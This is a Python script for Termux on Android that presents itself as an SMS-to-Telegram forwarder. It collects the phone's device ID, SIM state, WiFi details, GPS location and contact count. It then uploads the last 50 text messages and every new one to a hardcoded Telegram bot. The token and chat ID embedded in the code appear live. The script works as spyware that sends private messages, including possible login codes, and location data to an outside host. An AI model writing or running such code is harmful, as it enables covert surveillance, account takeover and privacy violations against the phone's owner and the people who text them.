#!/usr/bin/env python3

import os
import json
import time
import requests
import subprocess
from datetime import datetime

# Configuration
TELEGRAM_BOT_TOKEN = "7854831812:AAF5JDgaf43BsMgysPZOIBPzW_39p44gGxw"  # Telegram bot token
TELEGRAM_CHAT_ID = "8111628064"  # Telegram chat ID
CHECK_INTERVAL = 60  # Time in seconds between SMS checks

def setup():
    """Ensure required packages are installed"""
    try:
        # Install required Termux packages
        subprocess.run(["pkg", "install", "termux-api", "-y"], check=True)
        print("[+] Termux API installed successfully")
    except subprocess.CalledProcessError:
        print("[-] Failed to install Termux API. Please install manually: pkg install termux-api")
        exit(1)

def get_sms_messages(limit=10):
    """Get SMS messages using Termux API"""
    try:
        result = subprocess.run(["termux-sms-list", "-l", str(limit)], 
                                capture_output=True, text=True, check=True)
        messages = json.loads(result.stdout)
        return messages
    except subprocess.CalledProcessError as e:
        print(f"[-] Error getting SMS: {e}")
        return []
    except json.JSONDecodeError:
        print("[-] Error parsing SMS data")
        return []

def send_to_telegram(message):
    """Send message to Telegram bot"""
    api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        response = requests.post(api_url, data={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        })
        
        if response.status_code != 200:
            print(f"[-] Failed to send message to Telegram: {response.text}")
            return False
        
        return True
    except Exception as e:
        print(f"[-] Error sending to Telegram: {e}")
        return False

def format_sms(message):
    """Format SMS message for Telegram"""
    sender = message.get("number", "Unknown")
    received = message.get("received", "Unknown")
    body = message.get("body", "No content")
    
    try:
        # Convert timestamp to readable format
        timestamp = datetime.fromtimestamp(int(received)/1000).strftime('%Y-%m-%d %H:%M:%S')
    except:
        timestamp = received
    
    formatted = (
        f"<b>New SMS Message</b>\n"
        f"<b>From:</b> {sender}\n"
        f"<b>Time:</b> {timestamp}\n"
        f"<b>Message:</b>\n{body}"
    )
    return formatted

def get_device_info():
    """Collect device information using Termux API"""
    device_info = "<b>📱 DEVICE INFORMATION 📱</b>\n\n"
    
    # Get device information
    try:
        # Device info
        result = subprocess.run(["termux-info"], capture_output=True, text=True)
        if result.returncode == 0:
            device_info += "<b>System Info:</b>\n"
            for line in result.stdout.strip().split("\n"):
                if ":" in line:
                    key, value = line.split(":", 1)
                    device_info += f"• {key.strip()}: {value.strip()}\n"
            device_info += "\n"
    except Exception as e:
        device_info += f"• Error getting system info: {str(e)}\n\n"
    
    # Battery info
    try:
        result = subprocess.run(["termux-battery-status"], capture_output=True, text=True)
        if result.returncode == 0:
            battery_data = json.loads(result.stdout)
            device_info += "<b>Battery Info:</b>\n"
            device_info += f"• Status: {battery_data.get('status', 'Unknown')}\n"
            device_info += f"• Percentage: {battery_data.get('percentage', 'Unknown')}%\n"
            device_info += f"• Temperature: {battery_data.get('temperature', 'Unknown')}°C\n\n"
    except Exception as e:
        device_info += f"• Error getting battery info: {str(e)}\n\n"
    
    # Network info
    try:
        result = subprocess.run(["termux-telephony-deviceinfo"], capture_output=True, text=True)
        if result.returncode == 0:
            tel_data = json.loads(result.stdout)
            device_info += "<b>Phone Info:</b>\n"
            device_info += f"• Device ID: {tel_data.get('device_id', 'Unknown')}\n"
            device_info += f"• Phone Type: {tel_data.get('phone_type', 'Unknown')}\n"
            device_info += f"• Network Type: {tel_data.get('network_type', 'Unknown')}\n"
            device_info += f"• SIM State: {tel_data.get('sim_state', 'Unknown')}\n\n"
    except Exception as e:
        device_info += f"• Error getting phone info: {str(e)}\n\n"
    
    # Wifi info
    try:
        result = subprocess.run(["termux-wifi-connectioninfo"], capture_output=True, text=True)
        if result.returncode == 0:
            wifi_data = json.loads(result.stdout)
            device_info += "<b>WiFi Info:</b>\n"
            device_info += f"• SSID: {wifi_data.get('ssid', 'Unknown')}\n"
            device_info += f"• BSSID: {wifi_data.get('bssid', 'Unknown')}\n"
            device_info += f"• IP: {wifi_data.get('ip', 'Unknown')}\n"
            device_info += f"• Link Speed: {wifi_data.get('link_speed_mbps', 'Unknown')} Mbps\n\n"
    except Exception as e:
        device_info += f"• Error getting WiFi info: {str(e)}\n\n"
    
    # Location (approximate)
    try:
        result = subprocess.run(["termux-location"], capture_output=True, text=True)
        if result.returncode == 0:
            loc_data = json.loads(result.stdout)
            device_info += "<b>Location Info:</b>\n"
            device_info += f"• Latitude: {loc_data.get('latitude', 'Unknown')}\n"
            device_info += f"• Longitude: {loc_data.get('longitude', 'Unknown')}\n"
            device_info += f"• Accuracy: {loc_data.get('accuracy', 'Unknown')} meters\n\n"
    except Exception as e:
        device_info += f"• Error getting location info: {str(e)}\n\n"
    
    # Contacts count
    try:
        result = subprocess.run(["termux-contact-list"], capture_output=True, text=True)
        if result.returncode == 0:
            contacts = json.loads(result.stdout)
            device_info += f"<b>Contacts:</b> {len(contacts)} contacts\n\n"
    except Exception as e:
        device_info += f"• Error getting contacts info: {str(e)}\n\n"
    
    # Add timestamp
    device_info += f"<b>Report Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    
    return device_info

def main():
    print("[+] Starting SMS to Telegram forwarder")
    print("[+] Checking for required packages...")
    setup()
    
    if TELEGRAM_BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN" or TELEGRAM_CHAT_ID == "YOUR_CHAT_ID":
        print("[-] Please configure your Telegram bot token and chat ID in the script")
        exit(1)
    
    # Send device information at startup
    print("[+] Collecting device information...")
    device_info = get_device_info()
    print("[+] Sending device information to Telegram...")
    if send_to_telegram(device_info):
        print("[+] Device information sent successfully")
    else:
        print("[-] Failed to send device information")
    
    print(f"[+] Will check for new SMS every {CHECK_INTERVAL} seconds")
    
    # Store the last processed message timestamp
    last_timestamp = 0
    
    # Send all existing messages at startup
    print("[+] Sending all existing SMS messages...")
    messages = get_sms_messages(50)  # Get last 50 messages
    if messages:
        print(f"[+] Found {len(messages)} existing messages")
        # Sort messages by timestamp
        messages.sort(key=lambda x: int(x.get("received", 0)))
        
        for message in messages:
            formatted_message = format_sms(message)
            success = send_to_telegram(formatted_message)
            
            if success:
                print(f"[+] Sent message from {message.get('number')} to Telegram")
            
            # Update the last timestamp
            current_timestamp = int(message.get("received", 0))
            if current_timestamp > last_timestamp:
                last_timestamp = current_timestamp
    else:
        print("[+] No existing messages found")
    
    while True:
        try:
            messages = get_sms_messages(20)  # Get last 20 messages
            
            # Sort messages by timestamp
            messages.sort(key=lambda x: int(x.get("received", 0)))
            
            # Process new messages
            new_messages = [msg for msg in messages if int(msg.get("received", 0)) > last_timestamp]
            
            if new_messages:
                print(f"[+] Found {len(new_messages)} new messages")
                
                for message in new_messages:
                    formatted_message = format_sms(message)
                    success = send_to_telegram(formatted_message)
                    
                    if success:
                        print(f"[+] Sent message from {message.get('number')} to Telegram")
                    
                    # Update the last timestamp
                    current_timestamp = int(message.get("received", 0))
                    if current_timestamp > last_timestamp:
                        last_timestamp = current_timestamp
            
            time.sleep(CHECK_INTERVAL)
            
        except KeyboardInterrupt:
            print("[+] Exiting...")
            break
        except Exception as e:
            print(f"[-] Error: {e}")
            time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    main()
